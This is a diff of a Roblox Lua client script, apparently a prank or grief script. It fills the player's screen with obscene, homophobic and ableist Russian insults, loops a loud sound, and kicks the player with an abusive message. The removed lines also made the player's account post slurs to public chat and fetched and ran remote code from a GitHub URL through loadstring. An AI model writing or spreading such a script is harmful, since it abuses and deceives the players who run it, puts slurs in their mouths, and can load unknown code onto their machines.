@@ -1,11 +1,7 @@
 local player = game.Players.LocalPlayer
-local chatService = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
-
-game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("я бибизяна я пидарас гэй хуйло чмо обоссыш меня ебут в рот отчиими армея", "All")
 
 task.wait(3)
 
--- Создаем UI
 local gui = Instance.new("ScreenGui")
 gui.Parent = player:WaitForChild("PlayerGui")
 
@@ -13,19 +9,18 @@ local textLabel = Instance.new("TextLabel")
 textLabel.Parent = gui
 textLabel.Size = UDim2.new(1, 0, 1, 0)
 textLabel.Position = UDim2.new(0, 0, 0, 0)
-textLabel.Text = "СОСИ ХУЙ НЮХАЙ БЕБРУ ПИДАРАС ТЫ ЕБЛАН Я ЕБУ СЫРНИКИ ГЕРОИНЩИКА ТЫ ПИДОРАС СЫН ШЛЮХИ АЛЛАХУ АКБАР я еблан аутист еблан"
-textLabel.TextColor3 = Color3.new(1, 0, 0) -- Красный цвет
+textLabel.Text = "СОСИ ХУЙ НЮХАЙ БЕБРУ ПИДАРАС ТЫ ЕБЛАН Я ЕБУ СЫРНИКИ ГЕРОИНЩИКА ТЫ ПИДОРАС СЫН ШЛЮХИ АЛЛАХУ АКБАР ТЫ еблан аутист еблан ТЫ бибизяна ТЫ пидарас гэй хуйло чмо обоссыш ТЕБЯЯЯЯЯ ебут в рот отчиими армея"
+textLabel.TextColor3 = Color3.new(1, 0, 0)
 textLabel.TextScaled = true
 textLabel.BackgroundTransparency = 0
+textLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
 textLabel.Font = Enum.Font.SourceSansBold
 
--- Воспроизведение звука
 local sound = Instance.new("Sound", player.Character or player)
 sound.SoundId = "rbxassetid://2618158728"
+sound.Looped = true
 sound.Volume = 10
 sound:Play()
 
--- Кик через 10 секунд
-task.wait(10)
-player:Kick("нюхай пенис бибизяны сын шлюха")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ThacG/Xyros/refs/heads/main/test"))()
+task.wait(15)
+player:Kick("нюхай пенис сын бибизяны сын шлюха 666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666")
